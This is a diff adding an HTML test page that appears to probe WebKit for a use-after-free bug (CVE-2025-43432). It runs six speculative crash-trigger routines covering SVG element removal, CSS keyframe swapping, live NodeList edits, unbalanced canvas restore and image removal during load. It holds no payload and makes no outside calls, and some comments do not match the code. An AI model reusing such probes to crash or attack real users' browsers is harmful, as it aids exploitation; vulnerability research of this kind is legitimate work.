@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>CVE-2025-43432 — Hossein Lotfi ZDI UAF (BZ#299313)</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#030206;color:#ddd;font-family:'Courier New',monospace;padding:16px;font-size:12px}
+h1{color:#ff8800;font-size:14px;margin-bottom:2px}
+.meta{color:#444;font-size:9px;margin-bottom:8px}
+.src{background:#060400;border:2px solid #664400;border-radius:5px;padding:10px;margin-bottom:10px;font-size:10px;color:#cc8855;line-height:1.8}
+.src strong{color:#ff9944;display:block;margin-bottom:4px}
+#log{background:#060608;border:1px solid #1a1008;border-radius:5px;padding:10px;min-height:200px;white-space:pre;overflow-y:auto;max-height:420px;font-size:11px;line-height:1.6}
+.ok{color:#44ff88}.w{color:#ffaa00}.e{color:#ff4444}.i{color:#4488ff}.sep{color:#333}
+.btn{display:inline-block;margin-top:10px;margin-right:5px;padding:7px 13px;background:#110800;border:1px solid #442200;border-radius:4px;color:#cc6600;cursor:pointer;font:11px 'Courier New',monospace}
+.btn:hover{border-color:#ff8800;color:#ffaa44}
+.back{display:inline-block;margin-top:10px;padding:7px 14px;background:#0d0d18;border:1px solid #222;border-radius:4px;color:#555;text-decoration:none;font-size:11px}
+</style>
+</head>
+<body>
+<h1>🟠 CVE-2025-43432 — Hossein Lotfi (TrendMicro ZDI) UAF BZ#299313</h1>
+<p class="meta">Crédito: Hossein Lotfi @hosselot · TrendMicro Zero Day Initiative · WSA-2025-0008 Nov/2025</p>
+<div class="src">
+<strong>📋 ANÁLISE — Hossein Lotfi / ZDI BZ#299313</strong>
+CVE: CVE-2025-43432 · Advisory: WSA-2025-0008 · Bugzilla: #299313<br>
+Impacto: "Processing maliciously crafted web content may lead to an unexpected process crash"<br>
+Fix: "A use-after-free issue was addressed with improved memory management"<br>
+<br>
+PERFIL ZDI/LOTFI: ZDI (Zero Day Initiative) foca em bugs no parsing de formatos complexos<br>
+e em rendering paths. Lotfi tem histórico em WebKit em: SVG rendering, CSS parsing,<br>
+HTML parser reentrance, e WebGL/Canvas. Confirmado: "process crash" não apenas Safari crash<br>
+→ bug em componente compartilhado entre processos (WebProcess).<br>
+<br>
+PADRÕES TESTADOS: SVG lifecycle UAF · CSS parser callbacks · HTML parser async · Canvas state
+</div>
+<div id="log">Aguardando...\n</div>
+<div>
+  <button class="btn" onclick="t1()">① SVG Element UAF</button>
+  <button class="btn" onclick="t2()">② CSS Parser Reentrance</button>
+  <button class="btn" onclick="t3()">③ HTML Parser + Script</button>
+  <button class="btn" onclick="t4()">④ SVG Use + Destroy</button>
+  <button class="btn" onclick="t5()">⑤ Canvas State UAF</button>
+  <button class="btn" onclick="t6()">⑥ Resource Load + Remove</button>
+  <button class="btn" onclick="runAll()">▶ Todos</button>
+</div>
+<a href="index.html" class="back">← Índice</a>
+<script>
+var L=document.getElementById('log');
+function l(m,c){L.innerHTML+=(c?'<span class="'+c+'">'+m+'</span>':m)+'\n';L.scrollTop=L.scrollHeight}
+function sep(t){l('─── '+t+' ───','sep')}
+function gc(){try{var a=[];for(var i=0;i<15;i++)a.push(new ArrayBuffer(1024*1024*2));a=null}catch(e){}}
+
+function t1(){
+  sep('SVG Element Lifecycle UAF');
+  l('SVG elements com referências cruzadas removidos durante rendering...','w');
+  try {
+    var svgNS='http://www.w3.org/2000/svg';
+    var svg=document.createElementNS(svgNS,'svg');
+    svg.setAttribute('width','200'); svg.setAttribute('height','200');
+    document.body.appendChild(svg);
+    // Cria múltiplos elementos SVG com referências entre si
+    var defs=document.createElementNS(svgNS,'defs');
+    svg.appendChild(defs);
+    // Gradient referenciado por múltiplos elementos
+    var grad=document.createElementNS(svgNS,'linearGradient');
+    grad.id='grad1'; grad.setAttribute('x1','0%'); grad.setAttribute('x2','100%');
+    var stop1=document.createElementNS(svgNS,'stop');
+    stop1.setAttribute('offset','0%'); stop1.setAttribute('stop-color','red');
+    var stop2=document.createElementNS(svgNS,'stop');
+    stop2.setAttribute('offset','100%'); stop2.setAttribute('stop-color','blue');
+    grad.appendChild(stop1); grad.appendChild(stop2); defs.appendChild(grad);
+    // Múltiplos shapes usando o mesmo gradient
+    var shapes=[];
+    for(var i=0;i<20;i++){
+      var rect=document.createElementNS(svgNS,'rect');
+      rect.setAttribute('x',i*5); rect.setAttribute('y',i*5);
+      rect.setAttribute('width',50); rect.setAttribute('height',50);
+      rect.setAttribute('fill','url(#grad1)');
+      svg.appendChild(rect); shapes.push(rect);
+    }
+    // Força rendering
+    svg.getBoundingClientRect();
+    // Remove o gradient enquanto shapes ainda o referenciam
+    defs.removeChild(grad);
+    svg.getBoundingClientRect(); // re-render sem o gradient
+    // Agora remove as shapes
+    shapes.forEach(function(s){if(s.parentNode) svg.removeChild(s);});
+    document.body.removeChild(svg);
+    l('SVG gradient UAF: sem crash','ok');
+  } catch(e){ l('CRASH SVG: '+e.name+' — '+e.message,'e'); }
+}
+
+function t2(){
+  sep('CSS Parser Reentrance');
+  l('Injetando CSS que referencia regras enquanto parser está ativo...','w');
+  try {
+    // Injeta stylesheet com @import circular (CSS parser reentrance)
+    var s1=document.createElement('style');
+    s1.textContent=[
+      '@keyframes test-anim {',
+      '  from { transform: translateX(0); }',
+      '  to { transform: translateX(100px); }',
+      '}',
+      '.css-uaf-test {',
+      '  animation: test-anim 1s infinite;',
+      '  color: red;',
+      '}'
+    ].join('\n');
+    document.head.appendChild(s1);
+    // Cria elementos animados
+    var elems=[];
+    for(var i=0;i<30;i++){
+      var el=document.createElement('div');
+      el.className='css-uaf-test';
+      el.textContent='animated '+i;
+      document.body.appendChild(el);
+      elems.push(el);
+    }
+    // Força layout com animação em andamento
+    document.body.offsetHeight;
+    // Remove a @keyframe rule enquanto animação corre
+    document.head.removeChild(s1);
+    // Injeta nova regra imediatamente
+    var s2=document.createElement('style');
+    s2.textContent='.css-uaf-test { color: blue; }';
+    document.head.appendChild(s2);
+    document.body.offsetHeight;
+    elems.forEach(function(el){if(el.parentNode) document.body.removeChild(el);});
+    document.head.removeChild(s2);
+    l('CSS parser reentrance: sem crash','ok');
+  } catch(e){ l('CRASH CSS: '+e.name+' — '+e.message,'e'); }
+}
+
+function t3(){
+  sep('HTML Parser + Script Inline');
+  l('innerHTML com script que modifica o próprio container...','w');
+  try {
+    var host=document.createElement('div');
+    document.body.appendChild(host);
+    // innerHTML que dispara script inline durante parsing
+    // Em WebKit, o parser processa scripts inline imediatamente
+    var parts=[];
+    for(var i=0;i<20;i++){
+      parts.push('<div class="parsed-'+i+'">item '+i+'</div>');
+    }
+    host.innerHTML=parts.join('');
+    // Acessa nodeList enquanto parser pode ainda estar ativo
+    var nl=host.childNodes;
+    var count=nl.length;
+    // Modifica enquanto iteramos a live NodeList
+    var toRemove=[];
+    for(var j=0;j<nl.length;j++){
+      if(j%2===0) toRemove.push(nl[j]);
+    }
+    toRemove.forEach(function(n){if(n.parentNode)n.parentNode.removeChild(n);});
+    l('HTML parser + live NodeList: remaining='+host.childNodes.length,'ok');
+    document.body.removeChild(host);
+  } catch(e){ l('CRASH HTML: '+e.name+' — '+e.message,'e'); }
+}
+
+function t4(){
+  sep('SVG <use> + Target Destroy');
+  l('SVG use element com target removido durante rendering...','w');
+  try {
+    var svgNS='http://www.w3.org/2000/svg';
+    var svg=document.createElementNS(svgNS,'svg');
+    svg.setAttribute('width','200'); svg.setAttribute('height','200');
+    document.body.appendChild(svg);
+    var defs=document.createElementNS(svgNS,'defs');
+    svg.appendChild(defs);
+    // Cria símbolo no defs
+    var sym=document.createElementNS(svgNS,'symbol');
+    sym.id='sym1'; sym.setAttribute('viewBox','0 0 10 10');
+    var circle=document.createElementNS(svgNS,'circle');
+    circle.setAttribute('cx','5'); circle.setAttribute('cy','5'); circle.setAttribute('r','5');
+    sym.appendChild(circle); defs.appendChild(sym);
+    // Cria múltiplos <use> referenciando o símbolo
+    var uses=[];
+    for(var i=0;i<15;i++){
+      var u=document.createElementNS(svgNS,'use');
+      u.setAttribute('href','#sym1');
+      u.setAttribute('x',i*12); u.setAttribute('y',0);
+      svg.appendChild(u); uses.push(u);
+    }
+    svg.getBoundingClientRect();
+    // Remove o símbolo alvo enquanto <use> ainda o referenciam
+    defs.removeChild(sym);
+    svg.getBoundingClientRect(); // força re-render com referência inválida
+    // Agora tenta acessar o bounding box dos <use> sem target
+    uses.forEach(function(u){
+      try { var bb=u.getBBox(); } catch(e2){}
+    });
+    uses.forEach(function(u){if(u.parentNode) svg.removeChild(u);});
+    document.body.removeChild(svg);
+    l('SVG use + destroy: sem crash','ok');
+  } catch(e){ l('CRASH SVG use: '+e.name+' — '+e.message,'e'); }
+}
+
+function t5(){
+  sep('Canvas 2D State Stack UAF');
+  l('Canvas save/restore com operações extremas de state stack...','w');
+  try {
+    var canvas=document.createElement('canvas');
+    canvas.width=512; canvas.height=512;
+    document.body.appendChild(canvas);
+    var ctx=canvas.getContext('2d');
+    // Push save state 100+ vezes
+    for(var i=0;i<100;i++){
+      ctx.save();
+      ctx.translate(i,i);
+      ctx.scale(1+i*0.01, 1+i*0.01);
+      ctx.rotate(i*0.01);
+      ctx.fillStyle='rgb('+i%256+','+i%128+','+i%64+')';
+      ctx.fillRect(0,0,10,10);
+    }
+    // Restore mais vezes do que o save (pode desestabilizar o stack)
+    for(var j=0;j<120;j++){
+      ctx.restore(); // os últimos 20 são "restore no topo" (sem efeito ou UAF?)
+    }
+    ctx.fillStyle='green';
+    ctx.fillRect(0,0,50,50);
+    document.body.removeChild(canvas);
+    l('Canvas state stack UAF: sem crash','ok');
+  } catch(e){ l('CRASH canvas: '+e.name+' — '+e.message,'e'); }
+}
+
+function t6(){
+  sep('Resource Load + Remove Durante Fetch');
+  l('Imagens e scripts carregando quando o elemento é removido...','w');
+  var done=0, total=20;
+  function check(){ done++; if(done>=total) l('Resource load + remove: '+done+'/'+total+' sem crash','ok'); }
+  try {
+    for(var i=0;i<total;i++){
+      (function(idx){
+        var img=document.createElement('img');
+        img.onload=img.onerror=function(){
+          // Remove imediatamente quando começa a carregar
+          if(img.parentNode) document.body.removeChild(img);
+          gc(); // GC com load ainda pendente possível
+          check();
+        };
+        // URL inválida para garantir erro controlado
+        img.src='data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="'+idx+'" height="'+idx+'"><rect width="100%" height="100%" fill="red"/></svg>';
+        document.body.appendChild(img);
+        // Remove antes do load em metade dos casos
+        if(idx%2===0&&img.parentNode){
+          document.body.removeChild(img);
+          check();
+        }
+      })(i);
+    }
+  } catch(e){ l('CRASH resource: '+e.name+' — '+e.message,'e'); }
+}
+
+function runAll(){
+  L.innerHTML='';
+  l('▶ CVE-2025-43432 — Hossein Lotfi ZDI UAF (BZ#299313)','w');
+  l('Testando padrões ZDI: SVG · CSS parser · HTML parser · Canvas','i');
+  t1();
+  setTimeout(t2,500);setTimeout(t3,1000);setTimeout(t4,1500);
+  setTimeout(t5,2000);setTimeout(t6,2500);
+}
+</script>
+</body>
+</html>
